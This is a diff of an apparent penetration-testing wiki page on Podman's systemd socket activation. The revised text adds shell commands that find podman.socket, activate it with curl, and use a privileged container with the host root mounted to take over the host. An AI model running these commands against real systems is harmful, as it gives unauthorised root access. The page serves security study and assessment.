@@ -1,34 +1,45 @@
 ---
-title: "systemd socket activation: reaching the Podman socket through systemd"
-description: "Reaching the Podman API socket exposed through systemd socket activation, in user or system scope, where the podman.socket unit starts the service on demand, so an attacker who can reach the socket path drives the engine without the service running beforehand."
+title: "systemd socket activation: on-demand Podman API exposure"
+description: "Podman's API service is commonly started on demand through systemd socket activation: systemd owns the listening socket and launches Podman on the first connection. An attacker who can reach the activating socket, a user or system podman.socket unit, triggers the service and gains the same container-control API, with exposure depending on whether the socket is user or root scoped."
 keywords:
-  - podman.socket
   - systemd socket activation
-  - podman API
-  - user socket
-  - container runtime
+  - podman.socket
+  - podman api
+  - on-demand service
+  - container control
 ---
 
 # systemd socket activation
 
-Podman ships `podman.socket` units for systemd, in both system and per-user scope. With socket activation the service is not running until something connects, but the socket file exists, so reaching it starts the service and drives the engine. The user-scope socket lives under the user's runtime directory.
+Rather than run the Podman API service continuously, systems usually enable `podman.socket`, a systemd socket unit. systemd holds the listening socket and starts `podman system service` only when a client connects, then passes the accepted connection to it. For an attacker this is transparent: reaching the activating socket triggers the service and yields the Docker-compatible API. What matters is the socket's scope, a user `podman.socket` under `/run/user/<uid>/` or a system one under `/run/`, which decides whether the resulting service is rootless or rootful.
+
+Locate the activating socket and its scope:
 
 ```bash
+systemctl status podman.socket 2>/dev/null
 systemctl --user status podman.socket 2>/dev/null
-systemctl status podman.socket 2>/dev/null          # system scope (rootful)
-ls -l /run/user/*/podman/podman.sock /run/podman/podman.sock 2>/dev/null
+ls -l /run/podman/podman.sock /run/user/*/podman/podman.sock 2>/dev/null
+# a connection activates the service; confirm by calling it
+curl -s --unix-socket /run/podman/podman.sock http://d/version
+```
 
-# Connecting activates the service
-curl -s --unix-socket /run/user/1000/podman/podman.sock http://d/v1.40/libpod/info
+## Triggering and using it
+
+```bash
+# the first request activates podman system service behind the socket
+export DOCKER_HOST=unix:///run/podman/podman.sock
+docker info                                           # service now running
+# if system-scoped (rootful), proceed to host takeover
+docker run -v /:/host --privileged --rm -it alpine chroot /host sh
 ```
 
 ## Exploitation notes
 
-- System-scope `podman.socket` is rootful and root-equivalent; user-scope is bounded by that user.
-- The socket path is the target: filesystem access to it (a shared runtime dir, a bind mount, a group membership) is engine access.
-- Once connected, proceed as in [API service socket](api-service-socket.md).
+- Socket activation means the service may appear absent (no running process) yet be fully reachable; do not conclude the API is unavailable from the lack of a `podman system service` process, test the socket.
+- Scope is everything: a system `podman.socket` activates a rootful service and is a host-takeover path; a user socket is bounded by the [rootless model](rootless-model.md).
+- Reaching a user socket requires access as that user (or to their `/run/user/<uid>`), which a prior foothold as that user provides; the system socket is gated by its filesystem permissions.
 
 ## References
 
-- [podman system service](https://docs.podman.io/en/latest/markdown/podman-system-service.1.html)
+- [Podman: socket activation](https://docs.podman.io/en/latest/markdown/podman-systemd.unit.5.html)
 - [systemd.socket](https://www.freedesktop.org/software/systemd/man/systemd.socket.html)
